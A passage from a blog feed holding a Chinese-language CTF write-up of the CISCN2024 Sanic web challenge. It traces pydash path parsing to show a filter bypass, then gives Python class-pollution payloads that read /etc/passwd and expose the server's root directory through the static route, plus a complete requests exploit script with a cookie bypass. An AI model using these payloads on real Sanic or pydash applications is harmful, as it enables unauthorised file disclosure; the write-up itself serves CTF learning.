punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> text<span class=\"token punctuation\">(</span><span class=\"token string\">\"forbidden\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>从这里</p>\n<pre><code>pydash.set_(pollute, key, value)\n</code></pre>\n<p>到</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">set_</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">return</span> set_with<span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再到：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">update_with</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> updater<span class=\"token punctuation\">,</span> customizer<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># noqa: C901</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">callable</span><span class=\"token punctuation\">(</span>updater<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        updater <span class=\"token operator\">=</span> pyd<span class=\"token punctuation\">.</span>constant<span class=\"token punctuation\">(</span>updater<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> customizer <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">callable</span><span class=\"token punctuation\">(</span>customizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        call_customizer <span class=\"token operator\">=</span> partial<span class=\"token punctuation\">(</span>callit<span class=\"token punctuation\">,</span> clone<span class=\"token punctuation\">,</span> customizer<span class=\"token punctuation\">,</span> argcount<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">elif</span> customizer<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        call_customizer <span class=\"token operator\">=</span> partial<span class=\"token punctuation\">(</span>callit<span class=\"token punctuation\">,</span> customizer<span class=\"token punctuation\">,</span> argcount<span class=\"token operator\">=</span>getargcount<span class=\"token punctuation\">(</span>customizer<span class=\"token punctuation\">,</span> maxargs<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        call_customizer <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    default_type <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">else</span> <span class=\"token builtin\">list</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    tokens <span class=\"token operator\">=</span> to_path_tokens<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> pyd<span class=\"token punctuation\">.</span>is_list<span class=\"token punctuation\">(</span>tokens<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># pragma: no cover</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        tokens <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>tokens<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    last_key <span class=\"token operator\">=</span> pyd<span class=\"token punctuation\">.</span>last<span class=\"token punctuation\">(</span>tokens<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>last_key<span class=\"token punctuation\">,</span> PathToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        last_key <span class=\"token operator\">=</span> last_key<span class=\"token punctuation\">.</span>key</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    target <span class=\"token operator\">=</span> obj</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">for</span> idx<span class=\"token punctuation\">,</span> token <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>pyd<span class=\"token punctuation\">.</span>initial<span class=\"token punctuation\">(</span>tokens<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">,</span> PathToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            key <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span>key</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            default_factory <span class=\"token operator\">=</span> pyd<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>tokens<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>idx <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"default_factory\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span>default_type<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            key <span class=\"token operator\">=</span> token</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            default_factory <span class=\"token operator\">=</span> default_type</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        obj_val <span class=\"token operator\">=</span> base_get<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        path_obj <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> call_customizer<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            path_obj <span class=\"token operator\">=</span> call_customizer<span class=\"token punctuation\">(</span>obj_val<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">if</span> path_obj <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            path_obj <span class=\"token operator\">=</span> default_factory<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        base_set<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> path_obj<span class=\"token punctuation\">,</span> allow_override<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            target <span class=\"token operator\">=</span> base_get<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">except</span> TypeError <span class=\"token keyword\">as</span> exc<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># pragma: no cover</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                target <span class=\"token operator\">=</span> target<span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                _failed <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                _failed <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">if</span> _failed<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                <span class=\"token keyword\">raise</span> TypeError<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Unable to update object at index </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>key<span class=\"token conversion-option punctuation\">!r</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">. </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>exc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    value <span class=\"token operator\">=</span> base_get<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> last_key<span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    base_set<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> last_key<span class=\"token punctuation\">,</span> callit<span class=\"token punctuation\">(</span>updater<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">return</span> obj</pre></td></tr></table></figure><p>跟 tokens = to_path_tokens (path) 到：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">to_path_tokens</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"Parse `value` into :class:`PathToken` objects.\"\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> pyd<span class=\"token punctuation\">.</span>is_string<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span> <span class=\"token keyword\">in</span> value <span class=\"token keyword\">or</span> <span class=\"token string\">\"[\"</span> <span class=\"token keyword\">in</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\"># Since we can't tell whether a bare number is supposed to be dict key or a list index, we</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># list index and converted to an integer.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            PathToken<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> default_factory<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">if</span> RE_PATH_LIST_INDEX<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">else</span> PathToken<span class=\"token punctuation\">(</span>unescape_path_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> default_factory<span class=\"token operator\">=</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">for</span> key <span class=\"token keyword\">in</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> RE_PATH_KEY_DELIM<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">elif</span> pyd<span class=\"token punctuation\">.</span>is_string<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> pyd<span class=\"token punctuation\">.</span>is_number<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>PathToken<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span> default_factory<span class=\"token operator\">=</span><span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">elif</span> value <span class=\"token keyword\">is</span> UNSET<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        keys <span class=\"token operator\">=</span> value</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> keys</pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>RE_PATH_KEY_DELIM <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"(?&lt;!\\)(?:\\\\)*.|([\\d+])\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>发现\\.会当作.进行处理，可以绕过题目的过滤，而.会作为.的转义不进行分割\n__init__\\\\\\.__globals__\n等于\n__init__\\\\.__globals__\n等于\n__init__.__globals__\n</code></pre>\n<p>所以用这 payload 读文件：</p>\n<pre><code>&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;  //24bcbd0192e591d6ded1_flag\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151637773.png\" alt=\"image-20250515163721593\" /></p>\n<p>污染成功，但是不知道 flag 的文件名，注意到注册的 static 路由会添加 DirectoryHandler 到 route</p>\n<p>跟进 static</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151641482.png\" alt=\"image-20250515164121386\" /></p>\n<p>给了注释，可以翻译一下</p>\n<pre><code>directory_view(bool,optional):这是一个可选的布尔函数，用于决定当暴露一个目录是是否先是目录结构给用户，耳式按照其他预设方式处理目录访问亲环球，当设置为True，用户界面或API相应可能会改为先是目录的内容列表，类似于你在文件浏览器中看到的文件和子目录列表。\n\ndirectory_handler(Optional[DirectoryHandler],optional):这是一个更高级的配置选项，允许你提供一个自定义的DirectoryHandler实例.DirevotoryHandler是一个类或接口，定义了如何处理目录请求的具体行为，通过传入一个自定义的DirectortHandler实例，你可以控制和扩展应用程序处理目录时的默认行为。这包括但不小于权限控制，目录遍历逻辑，文件预览或其他任何自定义逻辑。Optional意味着这个参数是可以忽略的，如果不提供，默认的目录处理逻辑将会被使用。\n</code></pre>\n<p>大概就是当 directory_view 为 True 时，会开启列目录功能，directory_handler 中可以获取指定的目录跟进 directory_handler</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151754849.png\" alt=\"image-20250515175401704\" /></p>\n<p>发现 directory_handler 是对 DirectoryHandler 类的实例化：</p>\n<p>跟进 directory_view 这个</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151757293.png\" alt=\"image-20250515175720222\" /></p>\n<p>跟进这个类发现 directory_view 和 directory 所以只要我们将 directory 污染为根目录，directory_view 污染为 True，就可以看到根目录的所有文件了，这边我们可以开始操作了</p>\n<p>那么就是怎么找到这两个参数了，才能去修改</p>\n<h4 id=\"修改directory_view\"><a class=\"anchor\" href=\"#修改directory_view\">#</a> 修改 directory_view</h4>\n<p>再 sanic 框架中通过 app.route.name_index ['xxxxx'] 来获取注册的路由，我们可以直接输出看一下</p>\n<h5 id=\"printapproutername_indexkeys\"><a class=\"anchor\" href=\"#printapproutername_indexkeys\">#</a> print(app.router.name_index.keys())</h5>\n<p>但是我们发现没有找到这个路由的名字 name，那么我们可以通过 print (app.router.name_index.keys ()) 这条命令找到这些路由的默认名字</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505151838159.png\" alt=\"image-20250515183809043\" /></p>\n<pre><code>还能用\n\n#### print(app.router.name_index['__mp_main__.static'])\n</code></pre>\n<p>然后就是得找到哪里能找到调用到 DirectoryHandler 里呢？</p>\n<p>我们可以全局搜索一下在哪里有调用这个 name_index 方法</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152051169.png\" alt=\"image-20250515205148896\" /></p>\n<p>找到这个方法给个断点</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152053132.png\" alt=\"image-20250515205326960\" /></p>\n<p>找到这个 directory_view 的属性，可以</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152056755.png\" alt=\"image-20250515205614631\" /></p>\n<p>找到这个属性了，就可以直接将其设置值了</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"key\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"True\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>注意这里不能用 [] 来包裹其中的索引，污染和直接调用不同，我们需要用。来连接，而</p>\n<pre><code>__mp_main.static\n</code></pre>\n<p>是一个整体，不能分开，我们可以用两个反斜杠来转义就够了</p>\n<p>可以看到是污染成功了，访问 /static/，可以看到该目录下的文件</p>\n<h4 id=\"修改directory的值\"><a class=\"anchor\" href=\"#修改directory的值\">#</a> 修改 directory 的值</h4>\n<p>接下来就是设置 directory 就够了，我们先获取他的值</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token property\">\"key\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"True\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>但是发现在我 /static/ 时候确实 500 错误</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152141080.png\" alt=\"image-20250515214158892\" /></p>\n<p>发现这里的值不能进行字符串的赋值，</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152143496.png\" alt=\"image-20250515214304245\" /></p>\n<p>回到原地就是</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152143086.png\" alt=\"image-20250515214357002\" /></p>\n<p>发现是 parts 的值是 directory 的值</p>\n<p>我可以找到他的源码，看看它是怎么赋值的，或者直接本地调试是什么类型的</p>\n<p>本地的环境好像找不到_parts 这东西了，(可能版本太高了)</p>\n<pre><code>http://127.0.0.1:8000/src?cmd=print(app.router.name_index['__mp_main__.static'].handler.keywords['directory_handler'].directory._parts)\n</code></pre>\n<p>会报错</p>\n<p>那就看一下别人的复现吧</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152204894.png\" alt=\"image-20250515220457721\" /></p>\n<p>可以看到这里是获取一个 Path 对象我们跟进 Path 对象里</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152205379.png\" alt=\"image-20250515220515187\" /></p>\n<p>可以看到 parts 的值最后是给了_parts 这个属性，我们访问这个属性看看:</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505152205543.png\" alt=\"image-20250515220530355\" /></p>\n<p>看到这是一个 list, 那么这里很明显我们就可以直接污染了</p>\n<p>到此，我们两个污染点的污染链都已经明确，下面给出 paylaod:</p>\n<pre><code>#开启列目录功能\n&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;\n#将目录设置在根目录下&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;\n</code></pre>\n<p>至此，就可以直接打了。（呜呜呜呜呜，终于能复现一个国赛的 web 题了）</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>base <span class=\"token operator\">=</span> <span class=\"token string\">'http://a78602e2-d016-4f57-8017-f29321897c8b.challenge.ctf.show'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">'user'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'\"adm\\\\073n\"'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>base <span class=\"token operator\">+</span> <span class=\"token string\">'/login'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"true\"</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>data1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string\">\"key\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token string\">\"value\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>r <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>base <span class=\"token operator\">+</span> <span class=\"token string\">'/admin'</span><span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>base <span class=\"token operator\">+</span> <span class=\"token string\">'/admin'</span><span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=\">CISCN2024-WEB-Sanic gxngxngxn - gxngxngxn - 博客园</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL25ld3MvMTQwNTc=\">从 CISCN2024 的 sanic 引发对 python “原型链” 的污染挖掘 - 先知社区</span></p>\n",
            "tags": [
                "ciscn2024",
                "学习笔记",
                "python原型链污染"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/05/06/SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/",
            "url": "http://odiws.github.io/2025/05/06/SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/",
            "title": "[SWPU2019]伟大的侦探",
